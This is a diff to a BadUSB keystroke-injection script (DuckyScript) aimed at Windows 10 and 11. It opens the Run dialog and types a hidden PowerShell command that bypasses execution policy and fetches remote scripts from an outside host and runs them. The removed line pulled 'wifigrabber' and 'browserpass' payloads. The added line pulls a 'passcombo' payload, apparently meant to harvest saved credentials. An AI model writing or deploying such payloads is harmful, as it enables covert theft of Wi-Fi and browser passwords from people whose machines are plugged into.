@@ -8,6 +8,6 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING cmd /c start /min "" powershell -w h -NoP -Ep Bypass -Command "$dc='';$db='';irm badusb.39039820.xyz/wifigrabber | iex; irm badusb.39039820.xyz/browserpass | iex"
+STRING cmd /c start /min "" powershell -w h -NoP -Ep Bypass -Command "$dc='';$db='';irm badusb.39039820.xyz/passcombo | iex"
 DELAY 500
 ENTER
